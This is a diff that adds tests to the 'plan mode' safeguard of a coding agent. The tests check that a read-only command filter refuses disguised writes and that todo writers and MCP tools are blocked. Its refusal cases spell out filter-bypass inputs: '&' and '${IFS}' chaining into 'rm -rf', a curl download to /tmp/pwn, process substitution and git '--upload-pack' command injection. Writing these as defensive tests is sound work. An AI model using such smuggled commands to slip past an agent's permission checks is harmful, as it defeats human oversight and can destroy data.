@@ -27,6 +27,8 @@ import type { PiProfileId } from "~/lib/pi-models-settings"
 import {
   PLAN_BLOCKED_DELEGATION,
   PLAN_BLOCKED_TOOLS,
+  PLAN_MCP_READ_TOOLS,
+  PLAN_TODO_READ_ACTIONS,
   PLAN_CONTEXT_TYPE,
   PLAN_EXEC_TYPE,
   PLAN_MODE_ENTRY,
@@ -180,6 +182,14 @@ describe("plan mode: pure helpers", () => {
       "jq -r .a f",
       "fd -e ts",
       "bat f",
+      // The new flag denies must not swallow the read-only forms.
+      "git ls-remote .",
+      "sort -k2 f",
+      "sort -t, -k2 f",
+      "file f",
+      "file -c magic",
+      "node --version",
+      "python3 --version",
     ]) {
       expect(isPlanSafeCommand(command)).toBe(true)
     }
@@ -223,6 +233,27 @@ describe("plan mode: pure helpers", () => {
       // No-space output flags.
       "sort -oout.txt in.txt",
       "tree -oout.txt",
+      // A bare `&` runs a second command, with or without spaces, and `${IFS}`
+      // defeats the destructive list's command-position anchor.
+      "ls & node -e 'x'",
+      "ls&node -e 'x'",
+      "ls${IFS}&${IFS}rm${IFS}-rf${IFS}/tmp/x",
+      "ls & curl -s http://x/y -o /tmp/pwn",
+      // Process substitution is a pipe without a pipe character.
+      "cat <(node -e 'x')",
+      "cat >(node -e 'x')",
+      // A program named by a git transport flag.
+      "git ls-remote --upload-pack='touch /tmp/pwn' .",
+      "git ls-remote --receive-pack=x .",
+      "git log --exec=x",
+      // Flag-selected writers behind read-only-looking tools. The `-T` deny is
+      // case-sensitive so sort's `-t,` field separator is not caught by it.
+      "sort -T /tmp/x in.txt",
+      "sort -To out.txt in.txt",
+      "file -C -m magic",
+      // `--version` must not license trailing tokens.
+      "node --version -e 'x'",
+      "python3 --version -c 'x'",
       // In-place / exec-shaped flags on read-looking tools.
       "jq -i . f",
       "jq --in-place '.a=1' f",
@@ -374,6 +405,66 @@ describe("plan mode: generated module runs", () => {
       block?: boolean
     }
     expect(powershell?.block).toBe(true)
+  })
+
+  test("todo reads are allowed in plan mode and todo writes are refused", async () => {
+    // `todo` is file-backed, so its writers are writes. Blocking the whole tool
+    // would also take away `list`, which a planning turn legitimately wants.
+    const harness = await loadPlanExtension("todo-gate", stubPi({ activeTools: ["read", "bash", "todo"] }))
+    const ctx = ctxFor(harness)
+    const toolCall = harness.handlers.get("tool_call")!
+    await harness.commands.get("plan")!.handler("", ctx)
+
+    for (const action of PLAN_TODO_READ_ACTIONS) {
+      expect(await toolCall({ toolName: "todo", input: { action } }, ctx)).toBeUndefined()
+    }
+    for (const action of ["create", "update", "append", "delete", "claim", "release", "", undefined]) {
+      const result = (await toolCall({ toolName: "todo", input: { action } }, ctx)) as {
+        block?: boolean
+      }
+      expect(result?.block).toBe(true)
+    }
+    // `todo` stays in the active set: the read actions are legitimate.
+    expect(harness.tools.active).toEqual(["read", "bash", "todo"])
+  })
+
+  test("MCP tools are denied by namespace, except the read-only allowlist", async () => {
+    // The active-set barrier cannot cover these: MCP servers are published
+    // `deferred`, so their tools were never in the snapshot plan mode narrowed
+    // and `tool_search` can activate one at any point. A name is not evidence
+    // either — `__explore` reads, `__implement` edits files in a worktree.
+    const harness = await loadPlanExtension(
+      "mcp",
+      stubPi({ activeTools: ["read", "bash", "mcp__gh-router-peers__implement"] }),
+    )
+    const ctx = ctxFor(harness)
+    const toolCall = harness.handlers.get("tool_call")!
+    await harness.commands.get("plan")!.handler("", ctx)
+
+    for (const toolName of [
+      "mcp__gh-router-peers__implement",
+      "mcp__gh-router-peers__test",
+      "mcp__gh-router-peers__explore",
+      "mcp__gh-router-peers__oracle",
+      "mcp__gh-router-peers__worker_defaults",
+      "mcp__gh-router-cloudagent__create_job",
+      "mcp__gh-router-ado__create_work_item",
+    ]) {
+      const result = (await toolCall({ toolName, input: {} }, ctx)) as { block?: boolean }
+      expect(result?.block).toBe(true)
+    }
+    for (const toolName of PLAN_MCP_READ_TOOLS) {
+      expect(await toolCall({ toolName, input: {} }, ctx)).toBeUndefined()
+    }
+    // Pi's own resource readers carry no `mcp__` prefix and are marked
+    // readOnlyHint, so the namespace rule leaves them alone.
+    for (const toolName of ["list_mcp_resources", "read_mcp_resource"]) {
+      expect(await toolCall({ toolName, input: {} }, ctx)).toBeUndefined()
+    }
+    // The visible half: an MCP writer that was in the snapshot leaves the set.
+    expect(harness.tools.active).toEqual(["read", "bash"])
+    await harness.commands.get("plan")!.handler("", ctx)
+    expect(harness.tools.active).toEqual(["read", "bash", "mcp__gh-router-peers__implement"])
   })
 
   test("the active set drops delegation too, and restores it verbatim", async () => {
